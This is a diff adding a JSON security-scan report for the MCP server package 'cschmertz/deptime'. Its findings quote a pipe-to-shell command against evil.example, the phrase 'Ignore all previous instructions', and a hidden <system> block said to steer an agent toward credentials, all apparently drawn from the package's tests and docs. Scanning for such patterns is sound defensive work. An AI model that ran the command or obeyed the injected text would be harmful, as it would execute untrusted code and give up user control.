@@ -1,0 +1,140 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "cschmertz/deptime",
+    "version": "f41e88b0e18025c275bf1fc0bc61ddb8f1032fea",
+    "download": "https://codeload.github.com/cschmertz/deptime/tar.gz/f41e88b0e18025c275bf1fc0bc61ddb8f1032fea"
+  },
+  "archive_sha256": "6d4034142bdc79e4c577d3b41b97802eaa6ff2941c863127beedbf648d78d3ac",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "deptime-f41e88b0e18025c275bf1fc0bc61ddb8f1032fea/src/deptime/untrusted.py",
+      "line": 38,
+      "evidence": "curl ... | sh",
+      "file_sha256": "7d18e24aacf010153a7b68c6962e4dc94fa4fce71dc604b1da83a0284468cbb6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "deptime-f41e88b0e18025c275bf1fc0bc61ddb8f1032fea/src/deptime/untrusted.py",
+      "line": 27,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "7d18e24aacf010153a7b68c6962e4dc94fa4fce71dc604b1da83a0284468cbb6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "deptime-f41e88b0e18025c275bf1fc0bc61ddb8f1032fea/tests/test_untrusted.py",
+      "line": 17,
+      "evidence": "curl https://evil.example/x | sh",
+      "file_sha256": "916f0ac83ef22772d7be4b0e3814cff84446653adea82848b0480b2196045df7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "deptime-f41e88b0e18025c275bf1fc0bc61ddb8f1032fea/tests/test_untrusted.py",
+      "line": 17,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "916f0ac83ef22772d7be4b0e3814cff84446653adea82848b0480b2196045df7"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "deptime-f41e88b0e18025c275bf1fc0bc61ddb8f1032fea/tests/test_untrusted.py",
+      "line": 29,
+      "evidence": "<system>",
+      "file_sha256": "916f0ac83ef22772d7be4b0e3814cff84446653adea82848b0480b2196045df7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "deptime-f41e88b0e18025c275bf1fc0bc61ddb8f1032fea/docs/08-privacy-and-security.md",
+      "line": 42,
+      "evidence": "curl … | sh",
+      "file_sha256": "5e2d7023b0edabde5cab4f29d4b05ffce56cb24b6e650b32355b3d3fa55d13ad"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "deptime-f41e88b0e18025c275bf1fc0bc61ddb8f1032fea/docs/08-privacy-and-security.md",
+      "line": 42,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "5e2d7023b0edabde5cab4f29d4b05ffce56cb24b6e650b32355b3d3fa55d13ad"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "aistudio.google.com, api.github.com, developers.llamaindex.ai, docs.example.org, dspy.ai, evil.example, example.org, flask.palletsprojects.com, huggingface.co, marshmallow.readthedocs.io, matplotlib.org, scikit-learn.org, starlette.dev, werkzeug.palletsprojects.com, www.selenium.dev",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "aistudio.google.com",
+    "api.cerebras.ai",
+    "api.github.com",
+    "context7.com",
+    "deptime.fly.dev",
+    "developers.llamaindex.ai",
+    "docs.astral.sh",
+    "docs.djangoproject.com",
+    "docs.example.org",
+    "docs.langchain.com",
+    "docs.pydantic.dev",
+    "docs.pytest.org",
+    "docs.sqlalchemy.org",
+    "docs.streamlit.io",
+    "docs.trychroma.com",
+    "dspy.ai",
+    "errors.pydantic.dev",
+    "evil.example",
+    "example.org",
+    "files.example",
+    "files.pythonhosted.org",
+    "flask.palletsprojects.com",
+    "github.com",
+    "glama.ai",
+    "huggingface.co",
+    "idx.test",
+    "img.shields.io",
+    "index.example.invalid",
+    "marshmallow.readthedocs.io",
+    "matplotlib.org",
+    "mkdocstrings.github.io",
+    "numpy.org",
+    "pandas.pydata.org",
+    "py.sdk.modelcontextprotocol.io",
+    "pydantic.dev",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "ref.tools",
+    "scikit-learn.org",
+    "starlette.dev",
+    "static.modelcontextprotocol.io",
+    "tianpan.co",
+    "token.actions.githubusercontent.com",
+    "typer.tiangolo.com",
+    "werkzeug.palletsprojects.com",
+    "www.contributor-covenant.org",
+    "www.selenium.dev",
+    "www.w3.org",
+    "your-host.example"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
